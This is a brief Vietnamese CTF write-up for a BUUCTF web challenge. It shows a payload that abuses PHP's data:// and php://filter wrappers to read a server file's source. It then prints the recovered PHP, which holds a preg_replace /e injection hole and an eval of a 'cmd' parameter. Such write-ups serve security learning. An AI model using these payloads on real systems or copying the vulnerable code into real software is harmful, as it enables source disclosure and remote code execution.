![Screenshot 2023-12-19 100803](https://github.com/Llam-a/BUUCTF/assets/115911041/f8f686d1-21bf-42f8-b353-9519b1a0e616)

Challenge này khá giống chall [này](https://github.com/Llam-a/BUUCTF/blob/main/%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83.md) nên là mình skip vài bước đầu.

Payload: `?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&file=php://filter/convert.base64-encode/resource=next.php`

Sau đó được 1 chuỗi base64 đem đi decode

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```
